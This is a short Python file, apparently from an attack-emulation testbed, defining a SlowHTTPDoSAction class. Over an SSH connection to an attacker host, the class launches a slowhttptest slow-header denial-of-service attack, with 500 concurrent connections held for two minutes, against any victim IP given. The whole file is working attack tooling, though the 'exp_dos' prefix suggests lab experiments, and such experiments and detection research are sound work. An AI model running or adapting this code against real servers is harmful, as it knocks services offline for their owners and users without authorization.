import logging
logger = logging.getLogger("[Action:DOS]")

class SlowHTTPDoSAction:
    def __init__(self, port=8080, duration_s=120, concurrency=500, rate=200, output_prefix="exp_dos"):
        self.port = port
        self.duration_s = duration_s
        self.concurrency = concurrency
        self.rate = rate
        self.output_prefix = output_prefix

    def run(self, attacker_ssh, victim_ip: str):
        try:
            cmd = (
                f"IP={victim_ip}; slowhttptest -c {self.concurrency} -H -i 10 -r {self.rate} "
                f"-t GET -u http://$IP:{self.port}/ -x 24 -p 3 -l {self.duration_s} -o {self.output_prefix}"
            )
            logger.info(f"[DoS] Executando: {cmd}")
            attacker_ssh.run_command("attacker", cmd, timeout=self.duration_s + 180)
        except Exception as e:
            logger.error(f"[DoS] Falhou: {e}")
            raise
